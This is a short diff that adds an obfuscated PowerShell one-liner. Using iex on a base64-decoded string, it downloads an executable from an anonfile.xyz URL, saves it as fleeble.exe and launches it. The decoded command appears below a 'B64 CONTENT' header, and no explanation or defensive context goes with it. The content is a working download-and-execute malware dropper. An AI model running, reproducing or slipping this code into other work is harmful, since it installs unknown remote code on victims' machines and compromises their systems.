@@ -1,0 +1,7 @@
+iex([SYsTeM.tEXT.encODinG]::uTf8.GEtStRing([SYsTEM.cOnvERT]::fROMbAse64sTRinG('CihOZXctT2JqZWN0IHN5U3RlbS5ORXQuV0ViQ2xJRW5UKS5ET3dubG9hREZJbGUoJ2h0dHA6Ly9hbm9uZmlsZS54eXovZi8zZDBhNGZiNTQ5NDFlYjEwMjE0ZjNjMWE1ZmIzZWQ5OS5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object syStem.NEt.WEbClIEnT).DOwnloaDFIle('http://anonfile.xyz/f/3d0a4fb54941eb10214f3c1a5fb3ed99.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
